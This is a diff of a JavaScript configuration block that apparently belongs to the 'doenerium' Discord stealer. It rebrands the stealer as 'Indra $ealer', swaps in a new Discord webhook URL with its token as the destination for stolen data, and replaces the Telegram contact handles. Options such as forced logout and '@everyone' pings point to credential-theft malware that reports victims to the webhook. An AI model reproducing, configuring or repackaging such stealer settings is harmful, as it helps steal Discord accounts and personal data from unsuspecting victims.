@@ -11,9 +11,9 @@ const fs = require("fs");
 // Initialization
 
 var config = {
-    brand: "doenerium",
+    brand: "Indra",
 
-    webhook: "https://discord.com/api/webhooks/986732629871198299/HbfgOW7Ua0K_f_opSbLGPIAKtBBnOJaSFXTSX0fZHqOF3KEhDnv25_SHF9rD8zM7UGqm",
+    webhook: "https://discord.com/api/webhooks/987205564620750948/HYWu7pBtxvvZsJsMeOSjd23lRBVCOOLI0fffejsQcLQsH_caKVoSRJlU4pcQwCkIP_eb ",
 
     logout: true,
     disable_qr_code: true,
@@ -23,12 +23,12 @@ var config = {
     ping: [true, "@everyone"],
 
     embed: {
-        username: "doenerium | t.me/doener2323",
+        username: "Indra $ealer | t.me/OwnedByIndra",
         footer: {
-            text: `doenerium | t.me/doener2323`,
+            text: `Indra $Ealer | t.me/OwnedByIndra`,
             icon_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless",
         },
-        href: "https://t.me/doener2323",
+        href: "https://t.me/OwnedByIndra",
         avatar_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless"
     },
 
